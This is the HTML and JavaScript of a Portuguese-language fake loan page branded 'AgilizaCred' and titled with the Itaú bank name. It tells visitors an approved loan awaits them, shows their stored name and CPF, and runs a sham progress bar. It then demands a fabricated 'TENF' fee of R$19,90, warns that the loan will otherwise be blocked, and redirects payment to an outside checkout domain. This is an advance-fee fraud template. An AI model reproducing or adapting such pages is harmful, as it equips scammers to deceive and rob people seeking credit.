<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
   
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TENF — Itaú</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap');

        :root {
             --cred-primary: #ff6200;
            --cred-light: #ff6200;
            --cred-dark: #ff6200;
            --cred-accent: #111827;
            --btn-green: #22C55E;
            --btn-green-hover: #16A34A;
            --border: #e5e7eb;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'DM Sans', Arial, Helvetica, sans-serif;
            background-color: #F4F5F7;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            color: #111827;
        }

        .card,
        .loading {
            width: 100%;
            overflow: hidden;
        }

        /* Topbar e header em verde Credfácil */
        .topbar {
            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
            color: #fff;
            padding: 1rem 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .logo-img {
            height: 36px;
            width: auto;
            filter: brightness(0) invert(1);
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: .5rem;
            font-size: 1rem;
            font-weight: 500;
        }

        .user-avatar {
            width: 40px;
            height: 40px;
            background: rgba(255,255,255,0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .user-avatar svg {
            width: 24px;
            height: 24px;
            color: white;
        }

        .icons {
            display: flex;
            gap: 1rem;
        }

        .icons svg {
            width: 24px;
            height: 24px;
            color: white;
            opacity: 0.9;
        }

        .user-name {
            font-size: 1rem;
            font-weight: 600;
            color: #fff;
        }

        .main-header {
            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
            color: #fff;
            padding: 0.5rem 1.5rem 2rem 1.5rem;
        }

        .indenizacao-info {
            padding: 1.5rem;
            text-align: start;
            color: #000;
            font-weight: bold;
            background: white;
            margin: -1.5rem 1rem 1rem 1rem;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.1);
        }

        .indenizacao-info h2 {
            font-size: 1rem;
            margin-bottom: .5rem;
            color: #374151;
            font-weight: 600;
        }

        .indenizacao-info p {
            font-size: 1.5rem;
            font-weight: 800;
            color: var(--cred-primary);
        }

        .content {
            padding: 0 1rem 1rem 1rem;
        }

        /* Alert em verde */
        .alert {
            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-primary) 100%);
            color: #fff;
            padding: 1rem;
            font-weight: 500;
            margin-bottom: 1rem;
            border-radius: 12px;
            font-size: .95rem;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.2);
        }

        .pendencia {
            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
            border: 1px solid #bbf7d0;
            padding: 1.25rem;
            text-align: center;
            border-radius: 12px;
            margin-bottom: 1.5rem;
        }

        .pendencia h3 {
            font-size: 1rem;
            margin-bottom: .75rem;
            font-weight: 700;
            color: var(--cred-accent);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .pendencia h3::before {
            content: "";
        }

        .pendencia p {
            font-size: .9rem;
            line-height: 1.6;
            color: #374151;
        }

        .pendencia p strong {
            color: var(--cred-accent);
        }

        /* Botões VERDES */
        .button,
        .final-button {
            width: 100%;
            background: linear-gradient(135deg, var(--cred-light) 0%, var(--cred-dark) 100%);
            color: #fff;
            border: none;
            padding: 1rem;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 12px;
            cursor: pointer;
            transition: all .3s ease;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
        }

        .button:hover,
        .final-button:hover {
            filter: brightness(1.05);
            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
        }

        .button:active,
        .final-button:active {
            transform: scale(0.98);
        }

        .loading {
            display: none;
            flex-direction: column;
            align-items: flex-start;
            justify-content: flex-start;
            background-color: #fff;
            padding: 1.5rem;
            gap: 1rem;
            flex: initial;
            margin: 0 1rem;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.1);
        }

        .loading.active {
            display: flex;
        }

        .status-text {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--cred-primary);
            opacity: 1;
            transition: opacity .5s ease;
        }

        .status-text.fade-out {
            opacity: 0;
        }

        .progress-bar {
            width: 100%;
            max-width: 400px;
            height: 8px;
            background-color: #e5e7eb;
            border-radius: 8px;
            overflow: hidden;
        }

        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, var(--cred-light) 0%, var(--cred-primary) 100%);
            transition: width .1s linear;
            border-radius: 8px;
        }

        .final {
            display: none;
            flex-direction: column;
            padding: 1.5rem;
            gap: 1.5rem;
            background-color: #fff;
            margin: 0 1rem;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.1);
        }

        .summary-card {
            border: 2px solid var(--cred-primary);
            border-radius: 12px;
            padding: 1.25rem;
            text-align: center;
            background: linear-gradient(135deg, #f0fdf4 0%, #ffffff 100%);
        }

        .summary-card h2 {
            font-size: .95rem;
            color: #374151;
            margin-bottom: .75rem;
            font-weight: 600;
        }

        .summary-card p {
            font-size: 1.3rem;
            font-weight: 800;
            color: var(--cred-primary);
        }

        .info-box {
            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
            border: 1px solid #bbf7d0;
            border-radius: 12px;
            padding: 1.25rem;
            font-size: .9rem;
            color: #374151;
            line-height: 1.6;
            text-align: center;
        }

        .info-box b {
            color: var(--cred-accent);
        }

        .value {
            color: var(--cred-primary);
        }

        /* Security badge */
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-top: 0.5rem;
            padding: 0.75rem;
            background: #f9fafb;
            border-radius: 8px;
            font-size: 0.8rem;
            color: #6b7280;
        }

        .security-badge svg {
            width: 16px;
            height: 16px;
            color: var(--cred-primary);
        }

        /* Footer */
        .footer {
            margin-top: auto;
            text-align: center;
            padding: 1.5rem 1rem;
            background: #F4F5F7;
        }

        .footer-logo {
            height: 28px;
            margin-bottom: 0.5rem;
        }

        .footer small {
            font-size: 0.7rem;
            color: #9ca3af;
            line-height: 1.4;
            display: block;
        }

        .content-initial {
            margin-top: -1rem;
        }
    </style>
</head>

<body>

    <!-- CARD PRINCIPAL -->
    <div class="card active" id="card">
        <div class="topbar">
            <div class="logo-container">
                <div class="logo"><span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:20px;color:#fff;letter-spacing:-0.5px;">AgilizaCred</span></div>
            </div>
            <div class="user-info">
                <div class="user-avatar">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                    </svg>
                </div>
                <span class="user-name" id="user-name-top">Olá, Usuário</span>
            </div>
        </div>

        <div class="main-header"></div>

        <!-- LOADING -->
        <div class="loading" id="loading">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="bar"></div>
            </div>
            <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
        </div>

        <div class="content-initial">
            <div class="indenizacao-info">
                <h2><svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Empréstimo disponível</h2>
                <p class="value" id="valor-exibido">R$ 0,00</p>
            </div>

            <div class="content">
                <div class="alert" id="alert-nome">
                    <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:4px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>Atenção! <strong>Usuário</strong>, leia a mensagem abaixo para liberar seu empréstimo
                </div>

                <div class="pendencia">
                    <h3><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;color:#f59e0b"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>Pendência encontrada</h3>
                    <p>
                        Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de
                            Emissão de Nota Fiscal)</strong> no valor de R$19,90.

                        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. <br><br>
                        Clique no botão abaixo para calcular sua taxa TENF.
                    </p>
                </div>

                <button class="button" onclick="calcularFluxo()"><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>Calcular TAXA</button>
                
                <div class="security-badge">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                    </svg>
                    Ambiente seguro e criptografado
                </div>
            </div>
        </div>

        <div class="final" id="final">
            <div class="summary-card">
                <h2><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>TENF (Taxa de Emissão de Nota Fiscal)</h2>
                <p id="resumo-valor">Valor liberado: R$ 0,00</p>
            </div>

            <div class="info-box" id="info-extra">
                <br>Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota
                Fiscal).
                O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento,
                a transferência será feita para sua chave PIX cadastrada.
                Caso não conclua o pagamento, seu empréstimo será bloqueado.
            </div>

            <button class="final-button" onclick="redirectEducacional()"><svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>Efetuar o pagamento</button>
            
            <div class="security-badge">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                </svg>
                Transação protegida pela AgilizaCred
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div style="display:inline-flex;align-items:center;gap:0;margin-bottom:8px;justify-content:center;">
            <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:15px;color:#6B7280;letter-spacing:-0.5px;">Agiliza</span><span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:15px;color:#22C55E;letter-spacing:-0.5px;">Cred</span>
        </div>
        <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
    </div>

    <script>
        /** Util pra JSON seguro */
        function readJSON(key, fb = {}) {
            try {
                const raw = localStorage.getItem(key);
                if (!raw) return fb;
                const obj = JSON.parse(raw);
                return (obj && typeof obj === "object") ? obj : fb;
            } catch { return fb; }
        }

        /** Coleta de dados do localStorage com fallbacks */
        const nameLS = (localStorage.getItem("nome") || localStorage.getItem("name") || "").trim();
        const nomeUsu = (localStorage.getItem("nomeUsuario") || "").trim();
        const dados = readJSON("dadosUsuario", {});
        const nomeDoc = (dados.NOME || "").trim();

        const docLS = (localStorage.getItem("cpf") || localStorage.getItem("document") || "").trim();
        const cpfUsu = (localStorage.getItem("cpfUsuario") || "").trim();

        const nomeFinal = nameLS || nomeUsu || nomeDoc || "Usuário";
        const documento = docLS || cpfUsu || "";

        const creditoRaw = (
            localStorage.getItem("selectedLoanAmount") || 
            localStorage.getItem("creditoSolicitado") || 
            localStorage.getItem("valorEmprestimo") ||
            ""
        ).toString().trim();

        function normalizeToNumber(v) {
            if (typeof v === "number") return v;
            if (!v) return 0;
            let s = String(v).replace(/\s+/g, "");
            if (/,/.test(s) && /\./.test(s)) s = s.replace(/\./g, "").replace(",", ".");
            else if (/,/.test(s)) s = s.replace(",", ".");
            s = s.replace(/[^\d.-]/g, "");
            const n = Number(s);
            return Number.isFinite(n) ? n : 0;
        }
        
        function formatBRL(n) {
            try { return n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }); }
            catch { return "R$ " + (Math.round(n * 100) / 100).toFixed(2).replace(".", ","); }
        }

        const creditoNumber = normalizeToNumber(creditoRaw);
        const valorFormatado = creditoNumber > 0 ? formatBRL(creditoNumber) : "R$ 0,00";

        // Preenche UI
        document.getElementById("user-name-top").innerHTML = `Olá, ${(nomeFinal.split(/\s+/)[0] || "Usuário")}`;
        document.getElementById("valor-exibido").textContent = valorFormatado;
        document.getElementById("alert-nome").innerHTML =
            `<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:4px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>Atenção, <strong>${nomeFinal || "Usuário"}</strong>. Leia a mensagem abaixo para liberar seu empréstimo.`;

        // Simulação de progresso
        function calcularFluxo() {
            document.querySelector(".content-initial").style.display = "none";
            document.getElementById("loading").classList.add("active");

            const bar = document.getElementById("bar");
            const statusText = document.getElementById("status-text");
            let progress = 0, trocado = false;

            const it = setInterval(() => {
                if (progress >= 100) {
                    clearInterval(it);
                    document.getElementById("loading").classList.remove("active");
                    document.getElementById("final").style.display = "flex";
                    document.getElementById("resumo-valor").textContent = `Valor: ${valorFormatado}`;
                    document.getElementById("info-extra").innerHTML =
                        `<b>Nome:</b> ${nomeFinal || "-"} <br><b>CPF:</b> ${documento || "-"}<br><br>
                        Para você receber o seu valor, é obrigatório realizar o pagamento do <b>TENF (Taxa de Emissão de Nota Fiscal)</b>. 
                        O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
                        Após o pagamento, a transferência será feita para sua chave PIX cadastrada. 
                        <br><br><b>Caso não conclua o pagamento, seu empréstimo será bloqueado.</b>`;
                } else {
                    progress++;
                    bar.style.width = progress + "%";
                    if (progress === 70 && !trocado) {
                        trocado = true;
                        statusText.classList.add("fade-out");
                        setTimeout(() => {
                            statusText.textContent = "Finalizando análise...";
                            statusText.classList.remove("fade-out");
                        }, 450);
                    }
                }
            }, 30);
        }
        window.calcularFluxo = calcularFluxo;

        // Redirect
        function redirectEducacional() {
            const checkoutParams = new URLSearchParams(window.location.search);
            window.location.href = `https://pay.acesso-segurovf.site/eApQgzOQaX23Eb7?${checkoutParams.toString()}`;
        }
        window.redirectEducacional = redirectEducacional;
    </script>

    <script src="js/upsells.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            initUpsell(2);
        });
    </script>


</body></html>
